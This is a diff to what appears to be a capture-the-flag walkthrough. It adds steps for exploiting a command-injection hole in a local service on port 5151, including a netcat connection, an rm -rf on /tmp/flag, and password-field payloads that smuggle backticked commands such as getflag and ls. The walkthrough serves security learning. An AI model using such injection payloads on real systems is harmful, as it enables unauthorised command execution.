@@ -27,9 +27,12 @@ Password: ; echo `ls`; echo lol
 ```
 
 To exploit the security hole:
+- `rm -rf /tmp/flag`
 - `nc localhost 5151`
 - `o; echo 'getflag' > /tmp/flag; echo lol`  (*)
+<!-- - `o; echo `getflag` > /tmp/flag; echo lol`  (*) -->
 - `cat /tmp/flag`
+
 (*) Be careful with the quotes on que second command, it should be (`) instead of (').
 
 ## 🔍 Resources
